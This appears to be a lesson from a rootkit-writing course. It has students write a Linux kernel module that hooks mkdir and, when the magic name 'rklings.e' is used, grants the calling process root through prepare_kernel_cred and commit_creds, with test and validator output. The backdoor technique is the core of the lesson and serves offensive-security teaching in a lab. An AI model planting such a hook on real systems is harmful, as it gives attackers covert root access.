# L06: Mkdir Escalation

You can intercept mkdir.
Now make it do something an attacker needs: replace the calling process's
credentials with root.

## Process credentials

Every process carries a `struct cred` holding its uid, gid, and capabilities.
The kernel checks these on every file access, every syscall, every permission
decision.
Replace the cred and the process becomes root.

```c
struct cred *new_cred = prepare_kernel_cred(&init_task);
commit_creds(new_cred);
```

`init_task` is PID 1, the first process the kernel creates.
It runs with uid 0, gid 0, and full capabilities.
`prepare_kernel_cred` allocates a new credential structure copied from init's
credentials.
`commit_creds` installs that copy on the calling process.

After `commit_creds` returns, the caller is root.
That is the entire escalation: two function calls.

```text
  student (uid=1000)                 kernel module
    |                                     |
    |  mkdir("rklings.e")                 |
    |  ---------- mkdir("rklings.e") -->   |
    |                              RK_ON_MKDIR(name)
    |                                strcmp "rklings.e" -> match
    |                                prepare_kernel_cred(&init_task)
    |                                commit_creds(new_cred)
    |  <-- process is now uid=0            |
    |                                     |
    |  id                                 |
    |  uid=0(root) gid=0(root)            |
```

## You write

`main.c` (~40 lines):

- `RK_ON_MKDIR` handler with `strcmp` match on `"rklings.e"`
- `prepare_kernel_cred(&init_task)` + `commit_creds`

## API

```c
#include <linux/cred.h>
#include <linux/sched/task.h>

extern struct task_struct init_task;
struct cred *prepare_kernel_cred(struct task_struct *ref);
int commit_creds(struct cred *new);

int strcmp(const char *s1, const char *s2);
```

## Test it

The module is pre-loaded.
You log in as student.

```
$ rklings run l06
student@vm:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
student@vm:~$ mkdir rklings.e
mkdir: cannot create directory 'rklings.e': No such file or directory
student@vm:~$ id
uid=0(root) gid=0(root) groups=0(root)
student@vm:~$ dmesg | tail -1
rklings: escalated pid ... to root
```

## Validate

```
$ rklings validate l06
  [+] module loaded
  [+] uid=1000 before mkdir
  [+] mkdir rklings.e
  [+] uid=0 after mkdir
  [+] dmesg shows escalation
  [+] non-matching mkdir does not escalate
  PASS
```

## Next

L06 escalates the process that runs mkdir.
But sometimes you need to escalate a different process.
L07 adds deferred PID targeting.
